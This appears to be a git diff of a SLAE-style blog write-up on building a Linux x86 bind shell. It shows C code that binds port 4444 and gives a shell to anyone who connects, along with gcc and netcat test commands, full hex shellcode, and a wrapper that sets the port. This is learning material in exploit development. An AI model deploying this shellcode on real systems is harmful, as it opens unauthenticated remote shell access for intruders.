@@ -42,7 +42,7 @@ int main() {
   server.sin_port = htons(4444);              // port 4444
   server.sin_family = AF_INET;                // address family (ip v4)
 
-  // Bind socket to ip 0.0.0.0, port 4000 
+  // Bind socket to ip 0.0.0.0, port 4444 
   bind(socketd, (struct sockaddr*) &server, sizeof(server)); 
 
   // Listen for incoming connections 
@@ -61,8 +61,8 @@ int main() {
 } 
 ```
 
-Once application is compiled (`with: gcc bind.c`) and run (`./a.out`), we can confirm with netstat (`netstat -antvp`) and netcat (`nc -v 127.0.0.1 4000`) 
-that application is indeed listening at port 4000 and provides shell to whoever connects to listening port as shown on following screenshot.
+Once application is compiled (`with: gcc bind.c`) and run (`./a.out`), we can confirm with netstat (`netstat -antvp`) and netcat (`nc -v 127.0.0.1 4444`) 
+that application is indeed listening at port 4444 and provides shell to whoever connects to listening port as shown on following screenshot.
 ![bind shell](https://smarinovic.github.io/assets/img/slae_00001.png)
 
 ## Syscalls ##
@@ -446,13 +446,16 @@ objdump -d bind |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr 
 "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x66\xb8\x67\x01\xb3\x02\xb1\x01\xb2\x06\xcd\x80\x89\xc7\x31\xc9\x51\x51\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x89\xc3\x66\xb8\x69\x01\xb2\x16\xcd\x80\x31\xc0\xb8\x6b\x01\x00\x00\x89\xfb\xb1\x02\xcd\x80\x31\xc0\xb8\x6c\x01\x00\x00\x89\xfb\x31\xc9\x31\xd2\x31\xf6\xcd\x80\x31\xff\x89\xc7\xb1\x03\x31\xc0\xb0\x3f\x89\xfb\xfe\xc9\xcd\x80\x75\xf4\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
 ```
 
-And when we put it is skeleton C program, we can also confirm it works with netstat and netcat:
+And when we put it is skeleton C program, we can also confirm it works with netstat:
 
 ```
 gcc -fno-stack-protector -z execstack -m32 skeleton.c -o bind_shell
 
 ```
+![opcode test](https://smarinovic.github.io/assets/img/slae_00004.png)
 
+
+## Wrapper ##
 Last task was to make port argument easily configurable. Suggested way is to create wrapper. To create wrapper, we need to find where port number is located. Port number is 4444 which is presented as hex (little endian format): \x11\x5c. When we know the location of port, we can split shell code in pre-port part and post-port part. Python script generates hex representation of given port number and combines all three parts (pre-port, port and post-port part of shell code) in new shell code.  
 
 ```
@@ -498,5 +501,3 @@ Resulting opcode:
 we need to copy into skeleton.c, compile and run it, and as result bind_shell is listening on port 3333 as shown on following screen shot.
 
 ![wrapper test](https://smarinovic.github.io/assets/img/slae_00007.png)
-
-
